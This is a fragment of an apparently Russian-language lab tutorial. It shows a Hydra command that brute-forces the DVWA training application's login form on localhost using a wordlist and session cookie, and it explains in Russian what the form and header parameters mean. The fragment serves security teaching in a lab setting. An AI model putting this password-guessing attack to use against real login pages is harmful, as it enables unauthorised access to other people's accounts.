...
hydra -l admin -P /usr/share/dirb/wordlists/small.txt localhost http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=0o779juq162a1sta7oeb1vc5qu; security=medium:F=Username and/or password incorrect." -V
...
* "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=0o779juq162a1sta7oeb1vc5qu; security=medium:F=Username and/or password incorrect.": Это описание того, как должен быть построен запрос и как распознавать ответ от сервера.
...
* H=Cookie: PHPSESSID=0o779juq162a1sta7oeb1vc5qu; security=medium: Здесь задаются заголовки HTTP-запроса. В частности, используется куки с идентификатором сессии PHPSESSID=0o779juq162a1sta7oeb1vc5qu, что позволяет Hydra оставаться аутентифицированной в текущей сессии. Также указывается уровень безопасности DVWA (security=medium).
